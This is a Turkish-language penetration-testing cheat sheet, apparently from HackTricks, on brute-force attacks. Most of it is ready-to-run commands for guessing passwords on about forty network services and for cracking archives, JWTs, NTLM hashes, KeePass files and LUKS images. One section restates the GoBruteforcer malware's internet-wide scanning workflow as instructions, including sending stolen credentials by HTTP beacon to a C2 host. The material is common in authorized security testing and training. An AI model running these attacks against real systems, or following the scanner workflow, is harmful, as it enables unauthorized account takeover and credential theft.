# Brute Force - Kısa Başvuru

{{#include ../banners/hacktricks-training.md}}

## Varsayılan Kimlik Bilgileri

Kullanılan teknolojinin varsayılan kimlik bilgilerini **Google'da arayın** veya **şu bağlantıları deneyin**:

- [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
- [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
- [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
- [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
- [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
- [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
- [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
- [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
- [**https://many-passwords.github.io/**](https://many-passwords.github.io)
- [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Kendi Sözlüklerinizi Oluşturun**

Hedef hakkında bulabildiğiniz kadar çok bilgi edinin ve özel bir sözlük oluşturun. Yardımcı olabilecek araçlar:

### Crunch

```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```

### Web sitesi tabanlı wordlist'ler

```bash
# Cewl gets words from the victims page
cewl example.com -m 5 -w words.txt

# Tok (https://github.com/tomnomnom/hacks/tree/master/tok) gets words from a list of URLs
cat /path/to/urls.txt | tok

# https://github.com/m4ll0k/BBTz/blob/master/getjswords.py gets words from a list of JS URLs
cat /path/to/js-urls.txt | python3 getjswords.py
```

### [CUPP](https://github.com/Mebus/cupp)

Kurban hakkında bildiklerinize (isimler, tarihler...) dayalı parolalar oluşturun.

```
python3 cupp.py -h
```

### [Wister](https://github.com/cycurity/wister)

Bir wordlist oluşturma aracı. Bir kelime kümesi girerek bu kelimelerin farklı varyasyonlarını oluşturabilir, belirli bir hedefe uygun benzersiz ve ideal bir wordlist hazırlayabilirsiniz.

```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

 __          _______  _____ _______ ______ _____
 \ \        / /_   _|/ ____|__   __|  ____|  __ \
  \ \  /\  / /  | | | (___    | |  | |__  | |__) |
   \ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
    \  /\  /   _| |_ ____) |  | |  | |____| | \ \
     \/  \/   |_____|_____/   |_|  |______|_|  \_\

      Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```

### [pydictor](https://github.com/LandGrey/pydictor)

### Wordlists

- [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
- [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
- [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
- [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
- [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
- [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
- [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
- [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

## İnternet genelinde bruteforcer iş akışı (Go tabanlı tarayıcılardan çıkarılan dersler)

GoBruteforcer malware'inin tarama iş akışında aşağıdaki davranışlar gözlemlenmiştir; kesin değerler örneğe özgüdür.<sup>[[1]](#references)</sup>

- **Mimariye göre ayarlanmış worker pool'ları** kullanın (örneğin, `x86_64/arm64` üzerinde aynı anda 95 worker, `i686` üzerinde 85, `armv5tel` üzerinde 35 ve diğer mimarilerde varsayılan olarak 50 worker); etkin worker'ları her saniye kontrol edin ve sayıları hedefin altına düştüğünde yenilerini başlatın. Her worker, çıkmadan önce en fazla bir hedef IP'yi işler.
- **Rastgele herkese açık IPv4 adresleri** oluşturun; ancak açıkça yönlendirilemeyen ve operatör tarafından tarama dışı bırakılan belirli aralıkları atlayın: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, bulut kullanımının yoğun olduğu `/8` aralıkları (`3/15/16/56`) ve DoD ile ilişkili `/8` aralıkları (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
- **Açık metinle giriş denemeleri** yapmadan önce servis portunu kısa bir timeout ile (~2s) kontrol edin (FTP/21, MySQL/3306, Postgres/5432, HTTP/80 üzerinden phpMyAdmin); C2 kimlik bilgisi alınamazsa küçük bir yerleşik kimlik bilgisi listesine başvurun.
- Yaygın bir tarayıcı User-Agent'ını yeniden kullanarak, bulunan sonuçları `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` gibi küçük HTTP GET beacon'larıyla dışarı aktarın (servis kodları: `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`).
- **phpMyAdmin spray**, `GET /index.php?lang=en` ile olası yaklaşık 80 yolu brute-force edebilir, PMA belirteçlerini (`pmahomme` teması/`phpmyadmin.css`/`navigation.php`) tespit edebilir ve kimlik doğrulama yöntemini belirlemek için `codemirror.css?v=X.Y.Z` sürümünü ayrıştırabilir: `<4.9` sürümleri `pma_username`/`pma_password` GET parametrelerini kabul eder; `>=4.9` sürümlerinde `server=1`, CSRF `token` ve aynı kimlik bilgileriyle POST kullanılır.

## Servisler

Servis adına göre alfabetik olarak sıralanmıştır.

### AFP

```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```

### AJP

```bash
nmap --script ajp-brute -p 8009 <IP>
```

### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)

```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```

### Cassandra

```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```

### ClickHouse

[bruter](https://github.com/vflame6/bruter)

```bash
bruter clickhouse -u default -p passwords.txt localhost:9000
```

### CouchDB

```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```

### Docker Registry

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```

### Elasticsearch

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```

### FTP

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```

### HTTP Genel Brute

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Basic Auth

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```

### HTTP - NTLM

```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```

### HTTP - Post Form

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```

http**s** için "http-post-form" ifadesini "**https-post-form**" olarak değiştirmeniz gerekir

### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle

```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```

### IMAP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```

### IRC

```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```

### ISCSI

```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```

### JWT

```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```

### LDAP

```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```

### MQTT

```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```

### Mongo

```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```

### MSSQL

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
```

```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```

### MySQL

```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```

### OracleSQL

```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```

**oracle_login**'ı **patator** ile kullanmak için şunu **yüklemeniz** gerekir:

```bash
pip3 install cx_Oracle --upgrade
```

[Çevrimdışı OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**sürümler 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** ve **11.2.0.3**):

```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```

### POP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```

### PostgreSQL

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```

### PPTP

Kurulum için `.deb` paketini [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/) adresinden indirebilirsiniz.

```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```

### RDP

```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```

### Redis

```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```

### Rexec

```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```

### Rlogin

```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```

### Rsh

```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```

[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```

### RTSP

```bash
hydra -l root -P passwords.txt <IP> rtsp
```

### SFTP

```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

### SNMP

```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```

### SMB

```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```

### SMPP

```bash
bruter smpp -u smppclient1 -p passwords.txt localhost:2775
```

### SMTP

```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```

### SOCKS

```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```

### SQL Server

```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```

### SSH

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

#### Zayıf SSH keys / Debian tahmin edilebilir PRNG

Bazı sistemlerde, kriptografik materyal oluşturmak için kullanılan random seed'de bilinen kusurlar bulunur. Bu durum, [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) gibi araçlarla brute force uygulanabilecek şekilde keyspace'in önemli ölçüde daralmasına yol açabilir. [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh) gibi önceden oluşturulmuş zayıf anahtar kümeleri de mevcuttur.

### STOMP (ActiveMQ, RabbitMQ, HornetQ ve OpenMQ)

STOMP metin protokolü, RabbitMQ, ActiveMQ, HornetQ ve OpenMQ gibi popüler message queueing hizmetleriyle **sorunsuz iletişim ve etkileşim sağlayan** yaygın olarak kullanılan bir messaging protokolüdür. Mesaj alışverişi yapmak ve çeşitli messaging işlemlerini gerçekleştirmek için standartlaştırılmış ve verimli bir yaklaşım sunar.

```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```

### Telnet

```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
    --username admin \
    --password wordlists/passwords.txt \
    --target localhost:23 \
    --telnet-user-prompt "login: " \
    --telnet-pass-prompt "Password: " \
    --telnet-prompt ":~$ " \
    --single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```

### VNC

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -p 5900,5901 --script vnc-brute --script-args brute.credfile=wordlist.txt <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```

### Winrm

```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```


## Yerel

### Çevrimiçi cracking veritabanları

- [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1, ESS/SSP ile veya olmadan ve herhangi bir challenge değeriyle)
- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hash'ler, WPA2 capture'ları ve MSOffice, ZIP, PDF arşivleri...)
- [https://crackstation.net/](https://crackstation.net) (Hash'ler)
- [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
- [https://gpuhash.me/](https://gpuhash.me) (Hash'ler ve dosya hash'leri)
- [https://hashes.org/search.php](https://hashes.org/search.php) (Hash'ler)
- [https://www.cmd5.org/](https://www.cmd5.org) (Hash'ler)
- [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
- [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
- [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Bir Hash'e brute force uygulamadan önce buna göz atın.

### ZIP

```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```

#### Known plaintext zip attack

Şifrelenmiş zip dosyasının içindeki bir dosyanın **plaintext**'ini (veya plaintext'in bir kısmını) bilmeniz gerekir. Şifrelenmiş zip dosyasının içindeki **dosya adlarını ve dosya boyutlarını** şu komutla kontrol edebilirsiniz: **`7z l encrypted.zip`**\
[**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)uygulamasını releases sayfasından indirin.

```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```

### 7z

```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```

### PDF

```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```

### PDF Owner Parolası

PDF Owner parolasını kırmak için şuna bakın: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT

```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```

### NTLM cracking

```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```

### Keepass

```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

### Keberoasting

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Lucks imajı

#### Yöntem 1

Kurulum: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)

```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

#### Yöntem 2

```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

Başka bir Luks BF eğitimi: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql

```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```

### PGP/GPG Private key

```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```

### Cisco

<figure><img src="../images/image (663).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) kullanın, ardından john'u çalıştırın.

### Open Office Parola Korumalı Sütun

Parolayla korunan bir sütuna sahip bir xlsx dosyanız varsa, korumayı kaldırabilirsiniz:

- **Dosyayı Google Drive'a yükleyin**; parola otomatik olarak kaldırılır.
- **Elle kaldırmak** için:

```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```

### PFX Sertifikaları

```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```

## Araçlar

**Hash örnekleri:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifier

```bash
hash-identifier
> <HASH>
```

### Wordlist'ler

- **Rockyou**
- [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
